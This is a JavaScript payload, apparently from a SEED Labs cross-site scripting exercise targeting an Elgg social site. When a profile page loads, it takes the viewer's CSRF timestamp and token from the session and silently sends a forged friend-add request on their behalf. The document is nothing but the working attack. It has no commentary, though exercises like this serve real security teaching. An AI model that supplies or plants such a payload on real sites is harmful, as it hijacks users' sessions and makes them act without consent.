window.onload = function () {
	var Ajax=null;
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;
	var owner_id=elgg.page_owner.guid;
	var visitor_id=elgg.session.user.guid;
	var sendurl="http://www.seed-server.com/action/friends/add?friend="+owner_id+ts+ts+token+token;
	if (owner_id!=visitor_id){
		Ajax=new XMLHttpRequest();
		Ajax.open("GET",sendurl,true);
		Ajax.setRequestHeader("Host","www.seed-server.com");
		Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
		Ajax.send();
	}
}
